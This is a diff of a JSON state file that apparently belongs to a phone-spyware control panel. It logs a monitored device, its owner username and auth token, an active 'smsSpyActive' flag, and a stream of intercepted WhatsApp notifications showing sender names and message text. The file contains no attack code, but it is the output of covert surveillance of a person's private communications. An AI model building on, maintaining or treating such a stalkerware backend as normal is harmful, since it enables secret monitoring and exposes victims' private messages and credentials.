@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003907864,
+    "lastSeen": 1776003908331,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -130,6 +130,38 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎64 pesan baru",
+        "time": "12/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003910059
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (64 pesan): ~ zaa?",
+        "content": "💟 Stiker",
+        "time": "12/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003909880
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (63 pesan): ~ zaa?",
+        "content": "orang nya",
+        "time": "12/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003908701
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎63 pesan baru",
+        "time": "12/04 21:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003908692
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (64 pesan): ~ zaa?",
@@ -4097,38 +4129,6 @@
         "time": "12/04 17:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1775989914350
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎1 pesan baru",
-        "time": "12/04 17:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775989903543
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎1 pesan baru",
-        "time": "12/04 17:30",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775989858264
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎2 pesan baru",
-        "time": "12/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775989767900
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎1 pesan baru",
-        "time": "12/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775989765885
       }
     ],
     "galleryPhotos": [],
